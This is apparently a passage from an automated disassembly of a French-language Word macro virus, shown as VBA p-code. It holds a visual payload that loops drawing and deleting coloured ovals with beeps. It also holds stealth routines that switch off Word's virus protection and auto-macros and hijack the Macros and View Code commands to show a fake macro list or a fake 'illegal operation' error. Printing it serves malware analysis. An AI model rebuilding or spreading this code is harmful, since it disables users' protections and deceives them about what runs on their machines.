' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #104:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #105:
' 	ArgsCall Beep 0x0000 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #109:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x8000 0x4061 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #110:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #111:
' 	ArgsCall Beep 0x0000 
' Line #112:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #113:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #115:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4064 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #116:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #117:
' 	ArgsCall Beep 0x0000 
' Line #118:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #119:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #121:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x8000 0x4066 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #122:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #123:
' 	ArgsCall Beep 0x0000 
' Line #124:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #125:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #127:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4069 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #128:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #129:
' 	ArgsCall Beep 0x0000 
' Line #130:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #131:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #133:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x8000 0x406B 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #134:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #135:
' 	ArgsCall Beep 0x0000 
' Line #136:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #137:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #139:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x406E 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #140:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #141:
' 	ArgsCall Beep 0x0000 
' Line #142:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #143:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #145:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x4000 0x4070 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #146:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #147:
' 	ArgsCall Beep 0x0000 
' Line #148:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #149:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #151:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x8000 0x4071 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #152:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #153:
' 	ArgsCall Beep 0x0000 
' Line #154:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #155:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #157:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0xC000 0x4072 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #158:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #159:
' 	ArgsCall Beep 0x0000 
' Line #160:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #161:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #162:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #163:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4074 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #164:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #165:
' 	ArgsCall Beep 0x0000 
' Line #166:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #167:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #168:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #169:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x4000 0x4075 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #170:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #171:
' 	ArgsCall Beep 0x0000 
' Line #172:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #173:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #174:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #175:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x8000 0x4076 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #176:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #177:
' 	ArgsCall Beep 0x0000 
' Line #178:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #179:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #180:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #181:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0xC000 0x4077 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #182:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #183:
' 	ArgsCall Beep 0x0000 
' Line #184:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #185:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #186:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #187:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4079 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #188:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #189:
' 	ArgsCall Beep 0x0000 
' Line #190:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #191:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #193:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x4000 0x407A 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #194:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #195:
' 	ArgsCall Beep 0x0000 
' Line #196:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #197:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #198:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #199:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x8000 0x407B 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #200:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #201:
' 	ArgsCall Beep 0x0000 
' Line #202:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #203:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #204:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #205:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0xC000 0x407C 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #206:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #207:
' 	ArgsCall Beep 0x0000 
' Line #208:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #209:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #211:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x407E 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #212:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #213:
' 	ArgsCall Beep 0x0000 
' Line #214:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #215:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #216:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #217:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x4000 0x407F 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #218:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #219:
' 	ArgsCall Beep 0x0000 
' Line #220:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #221:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #222:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #223:
' 	GoTo Charge 
' Line #224:
' 	Label ErrorPL 
' Line #225:
' 	EndSub 
' Line #226:
' 	FuncDefn (Sub ToolsMacro())
' Line #227:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #228:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #229:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #230:
' 	OnError ErrorTM 
' Line #231:
' 	Ld UserForm999 
' 	ArgsMemCall Show 0x0000 
' Line #232:
' 	Label ErrorTM 
' Line #233:
' 	EndSub 
' Line #234:
' 	FuncDefn (Sub ViewVBCode())
' Line #235:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #236:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #237:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #238:
' 	OnError ErrorVVBC 
' Line #239:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #240:
' 	Label ErrorVVBC 
' Line #241:
' 	EndSub 
' Macros/VBA/UserForm900 - 5148 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #5:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #6:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #10:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #15:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #20:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #21:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #25:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #30:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #34:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ld TextBox1 
' 	MemSt Then 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld CommandButton2 
' 	MemSt Enabled 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #38:
' 	EndSub 
' Macros/VBA/UserForm999 - 7659 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub ListBox1_Click())
' Line #9:
' 	LitDI2 0x0000 
' 	Ld ListBox1 
' 	ArgsMemLd Selected 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ListBox1 
' 	ArgsMemLd Selected 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #15:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #16:
' 	LitVarSpecial (True)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #28:
' 	LitStr 0x000D "Commande Word"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #29:
' 	LitStr 0x0017 "Tous les modèles actifs"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #30:
' 	LitStr 0x001A "Normal.dot (modèle global)"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd WindowName$ 0x0000 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #34:
' 	LitStr 0x000F "Macro créée le "
' 	Ld Date 
' 	Concat 
' 	LitStr 0x0005 " par "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld TextBox2 
' 	MemSt Then 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #38:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #39:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #42:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
